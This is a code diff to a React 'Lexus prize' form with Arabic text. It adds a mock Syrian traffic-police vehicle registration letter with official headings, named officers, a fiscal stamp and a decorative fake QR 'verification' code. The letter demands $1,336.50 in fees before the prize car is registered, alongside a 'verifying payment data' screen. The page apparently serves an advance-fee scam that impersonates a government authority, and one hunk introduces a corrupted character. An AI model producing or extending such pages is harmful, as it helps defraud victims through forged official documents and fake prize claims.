@@ -170,7 +170,7 @@ export function LexusPrizeForm() {
           <p className="text-muted-foreground text-base leading-relaxed">
             يرجى الانتظار، يتم الآن التحقق من بيانات الدفع
             <br />
-            لا تغلق الصفحة
+            ��ا تغلق الصفحة
           </p>
         </CardContent>
       </Card>
@@ -516,47 +516,238 @@ export function LexusPrizeForm() {
           </CardContent>
         </Card>
 
-        {/* Insurance Card */}
-        <Card className="bg-card border-gold/30">
-          <CardContent className="p-5 md:p-6">
-            <div className="flex items-start gap-4">
-              <div className="flex-shrink-0 w-12 h-12 rounded-full bg-gold/10 border border-gold/30 flex items-center justify-center">
-                <ShieldCheck className="w-6 h-6 text-gold" />
-              </div>
-              <div className="flex-1">
-                <h3 className="text-lg md:text-xl font-extrabold text-foreground mb-2">
-                  بوليصة تأمين المركبة الإلزامي
-                </h3>
-                <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-sm">
-                  <div className="flex justify-between border-b border-border/40 pb-1.5">
-                    <span className="text-muted-foreground">المؤمَّن له:</span>
-                    <span className="text-foreground font-bold">{formData.fullName || "—"}</span>
+        {/* Vehicle Registration Certificate (شهادة تسجيل المركبة) */}
+        <Card className="bg-white border-2 border-amber-700 overflow-hidden shadow-xl">
+          <CardContent className="p-0">
+            {/* Decorative top border */}
+            <div className="h-2 bg-gradient-to-r from-amber-700 via-amber-500 to-amber-700" />
+
+            {/* Bismillah */}
+            <div className="text-center py-3 bg-white border-b border-amber-200">
+              <p className="text-amber-800 font-bold text-sm md:text-base">
+                بسم الله الرحمن الرحيم
+              </p>
+            </div>
+
+            {/* Header */}
+            <div className="p-4 md:p-6 bg-white border-b-2 border-amber-700">
+              <div className="grid grid-cols-3 items-start gap-2">
+                {/* Left - Numbers */}
+                <div className="text-amber-900 text-[10px] md:text-xs font-bold space-y-1 text-right">
+                  <div className="flex justify-between gap-2">
+                    <span>2026 / 2347</span>
+                    <span>: الرقم</span>
                   </div>
-                  <div className="flex justify-between border-b border-border/40 pb-1.5">
-                    <span className="text-muted-foreground">رقم البوليصة:</span>
-                    <span className="text-foreground font-bold">INS-{referenceNumber.slice(3)}</span>
+                  <div className="flex justify-between gap-2">
+                    <span>02/05/2026</span>
+                    <span>: التاريخ</span>
                   </div>
-                  <div className="flex justify-between border-b border-border/40 pb-1.5">
-                    <span className="text-muted-foreground">نوع التأمين:</span>
-                    <span className="text-foreground font-bold">شامل + ضد الغير</span>
+                  <div className="flex justify-between gap-2">
+                    <span>5 / شوال / 1447 هـ</span>
+                    <span>: الموافق</span>
                   </div>
-                  <div className="flex justify-between border-b border-border/40 pb-1.5">
-                    <span className="text-muted-foreground">مدة التغطية:</span>
-                    <span className="text-foreground font-bold">12 شهر</span>
+                </div>
+
+                {/* Center - Eagle Emblem */}
+                <div className="flex flex-col items-center">
+                  <div className="w-14 h-14 md:w-20 md:h-20 rounded-full bg-gradient-to-br from-amber-500 to-amber-800 flex items-center justify-center border-4 border-amber-700">
+                    <svg viewBox="0 0 24 24" className="w-8 h-8 md:w-12 md:h-12 text-amber-100" fill="currentColor">
+                      <path d="M12 2L4 7v6c0 5.5 3.8 10.7 8 12 4.2-1.3 8-6.5 8-12V7l-8-5z" />
+                    </svg>
                   </div>
-                  <div className="flex justify-between border-b border-border/40 pb-1.5">
-                    <span className="text-muted-foreground">المركبة:</span>
-                    <span className="text-foreground font-bold">جيب لكزس LX 600</span>
+                  <div className="mt-1 px-2 py-0.5 bg-amber-700 text-white text-[8px] md:text-[10px] font-bold rounded">
+                    TRAFFIC POLICE
                   </div>
-                  <div className="flex justify-between border-b border-border/40 pb-1.5">
-                    <span className="text-muted-foreground">الحالة:</span>
-                    <span className="text-green-500 font-bold flex items-center gap-1">
-                      <CheckCircle2 className="w-4 h-4" /> سارية المفعول
-                    </span>
-                  </div>
+                  <p className="text-amber-900 text-[9px] md:text-xs font-bold mt-1">فرع مرور دمشق</p>
+                </div>
+
+                {/* Right - Authority */}
+                <div className="text-amber-900 text-[10px] md:text-sm font-bold space-y-1 text-right">
+                  <p>الجمهورية العربية السورية</p>
+                  <p>إدارة مرور الشام</p>
+                  <p>فرع درعا</p>
                 </div>
               </div>
             </div>
+
+            {/* Title */}
+            <div className="text-center py-5 bg-white border-b border-amber-300">
+              <h3 className="text-xl md:text-2xl font-extrabold text-amber-900 leading-tight">
+                كتاب تسجيل مركبة
+                <br />
+                لدى إدارة مرور الشام
+              </h3>
+            </div>
+
+            {/* Body */}
+            <div className="p-4 md:p-6 bg-white text-amber-950 space-y-4">
+              <div className="flex items-center gap-2 text-sm md:text-base">
+                <span className="font-bold">: إلى السيد</span>
+                <span className="font-bold text-amber-900 border-b border-amber-700 px-3 flex-1 text-right">
+                  {formData.fullName || "—"}
+                </span>
+              </div>
+              <p className="text-xs md:text-sm font-bold">تحية طيبة وبعد ،،</p>
+              <p className="text-xs md:text-sm leading-relaxed">
+                بناءً على طلبكم لتسجيل المركبة لدى إدارة مرور الشام، وبعد التدقيق على الوثائق والمستندات
+                المقدمة، وبناءً على أحكام القوانين والأنظمة المرورية النافذة، تقرر تسجيل بيانات المركبة
+                وإعطاؤها رقم لوحة على النحو التالي:
+              </p>
+
+              {/* Vehicle Info Table */}
+              <div className="border-2 border-amber-800 rounded overflow-hidden">
+                <table className="w-full text-xs md:text-sm">
+                  <tbody>
+                    <tr className="border-b border-amber-800">
+                      <td className="p-2 text-right font-bold bg-amber-50 w-1/3 border-l border-amber-800">
+                        نوع المركبة
+                      </td>
+                      <td className="p-2 text-right text-amber-950 font-bold">جيب لكزس LX 600</td>
+                    </tr>
+                    <tr className="border-b border-amber-800">
+                      <td className="p-2 text-right font-bold bg-amber-50 border-l border-amber-800">
+                        موديل
+                      </td>
+                      <td className="p-2 text-right text-amber-950">2025</td>
+                    </tr>
+                    <tr className="border-b border-amber-800">
+                      <td className="p-2 text-right font-bold bg-amber-50 border-l border-amber-800">
+                        لون المركبة
+                      </td>
+                      <td className="p-2 text-right text-amber-950">أبيض</td>
+                    </tr>
+                    <tr className="border-b border-amber-800">
+                      <td className="p-2 text-right font-bold bg-amber-50 border-l border-amber-800">
+                        رقم المركبة (اللوحة)
+                      </td>
+                      <td className="p-2 text-right">
+                        <div className="inline-flex items-center gap-2 border-2 border-amber-900 rounded px-3 py-1 bg-white">
+                          <span className="font-extrabold text-amber-950 text-sm md:text-base">سوريا</span>
+                          <span className="font-extrabold text-amber-950 text-sm md:text-base">64</span>
+                          <span className="text-[10px] font-bold text-amber-700 border border-amber-700 rounded px-1">
+                            SYR
+                          </span>
+                          <span className="font-extrabold text-amber-950 text-sm md:text-base">10728</span>
+                        </div>
+                      </td>
+                    </tr>
+                    <tr className="border-b border-amber-800">
+                      <td className="p-2 text-right font-bold bg-amber-50 border-l border-amber-800">
+                        رقم الشاصي
+                      </td>
+                      <td className="p-2 text-right text-amber-950 font-mono">JTJMB7CX5R4065541</td>
+                    </tr>
+                    <tr>
+                      <td className="p-2 text-right font-bold bg-amber-50 border-l border-amber-800">
+                        اسم المالك
+                      </td>
+                      <td className="p-2 text-right text-amber-950 font-bold">
+                        {formData.fullName || "—"}
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+
+              {/* Fees Table */}
+              <div className="pt-2">
+                <p className="font-bold text-sm md:text-base mb-2 text-right">: تفصيل الرسوم والبدلات</p>
+                <div className="border-2 border-amber-800 rounded overflow-hidden">
+                  <table className="w-full text-xs md:text-sm">
+                    <thead className="bg-amber-50 border-b-2 border-amber-800">
+                      <tr>
+                        <th className="p-2 text-right font-bold text-amber-950 w-10 border-l border-amber-800">
+                          م
+                        </th>
+                        <th className="p-2 text-right font-bold text-amber-950 border-l border-amber-800">
+                          البيان
+                        </th>
+                        <th className="p-2 text-right font-bold text-amber-950">القيمة بالدولار الأمريكي</th>
+                      </tr>
+                    </thead>
+                    <tbody className="text-amber-950">
+                      {[
+                        ["1", "رسوم كاملة للمرور", "$ 917"],
+                        ["2", "طوابع", "$ 119"],
+                        ["3", "تكلفة إصدار لوحة حديدية عدد 2", "$ 170"],
+                        ["4", "تكلفة طباعة شهادة مركبة", "$ 97"],
+                        ["5", "رسوم قائض وفوائد", "$ 33.5"],
+                      ].map(([no, desc, val]) => (
+                        <tr key={no} className="border-b border-amber-200">
+                          <td className="p-2 text-right border-l border-amber-200">{no}</td>
+                          <td className="p-2 text-right border-l border-amber-200">{desc}</td>
+                          <td className="p-2 text-right font-medium">{val}</td>
+                        </tr>
+                      ))}
+                      <tr className="bg-amber-100 font-extrabold border-t-2 border-amber-800">
+                        <td colSpan={2} className="p-2.5 text-right text-amber-950 border-l border-amber-300">
+                          الإجمالي الكلي
+                        </td>
+                        <td className="p-2.5 text-right text-amber-950 text-base">$ 1,336.50</td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+              </div>
+
+              <p className="text-[11px] md:text-xs leading-relaxed text-amber-900">
+                <span className="font-bold">ملاحظة:</span> يعتبر هذا التسجيل نافذاً بعد تسديد الرسوم
+                والبدلات المذكورة أعلاه، والالتزام بكافة القوانين والأنظمة المرورية المعمول بها.
+              </p>
+
+              {/* Signatures */}
+              <div className="grid grid-cols-3 gap-3 pt-4 border-t-2 border-amber-300">
+                <div className="text-center text-[10px] md:text-xs">
+                  <p className="font-bold text-amber-950 mb-1">الموظف المختص</p>
+                  <p className="text-[9px] md:text-[11px] text-amber-900 mb-2">
+                    الرقيب أول محمود العلي
+                  </p>
+                  <div className="h-8 flex items-center justify-center text-amber-700 italic font-serif text-sm">
+                    ✓
+                  </div>
+                </div>
+                <div className="flex flex-col items-center justify-center">
+                  <div className="w-16 h-16 md:w-20 md:h-20 rounded-full border-2 border-amber-700 flex items-center justify-center bg-amber-50">
+                    <div className="text-center">
+                      <p className="text-[8px] md:text-[10px] font-bold text-amber-800 leading-tight">
+                        طابع مالي
+                      </p>
+                      <p className="text-amber-900 font-extrabold text-sm md:text-base">119$</p>
+                      <p className="text-[7px] md:text-[9px] font-bold text-amber-800 leading-tight">
+                        إدارة مرور الشام
+                      </p>
+                    </div>
+                  </div>
+                </div>
+                <div className="text-center text-[10px] md:text-xs">
+                  <p className="font-bold text-amber-950 mb-1">مدير مرور الشام</p>
+                  <p className="text-[9px] md:text-[11px] text-amber-900 mb-2">
+                    المقدم فادي أحمد العيد الله
+                  </p>
+                  <div className="h-8 flex items-center justify-center text-amber-700 italic font-serif text-sm">
+                    ✓
+                  </div>
+                </div>
+              </div>
+
+              {/* QR + Verification */}
+              <div className="flex items-center gap-3 pt-4 border-t border-amber-200">
+                <div className="w-14 h-14 md:w-16 md:h-16 bg-white border-2 border-amber-900 rounded grid grid-cols-4 grid-rows-4 gap-0.5 p-1 flex-shrink-0">
+                  {Array.from({ length: 16 }).map((_, i) => (
+                    <div
+                      key={i}
+                      className={`${[0, 2, 5, 6, 8, 11, 13, 14, 15].includes(i) ? "bg-amber-900" : ""}`}
+                    />
+                  ))}
+                </div>
+                <p className="text-[10px] md:text-xs text-amber-900 leading-relaxed">
+                  للتحقق من صحة البيانات يرجى مسح رمز QR أو زيارة الموقع الرسمي لإدارة مرور الشام.
+                </p>
+              </div>
+            </div>
+
+            {/* Decorative bottom border */}
+            <div className="h-2 bg-gradient-to-r from-amber-700 via-amber-500 to-amber-700" />
           </CardContent>
         </Card>
 
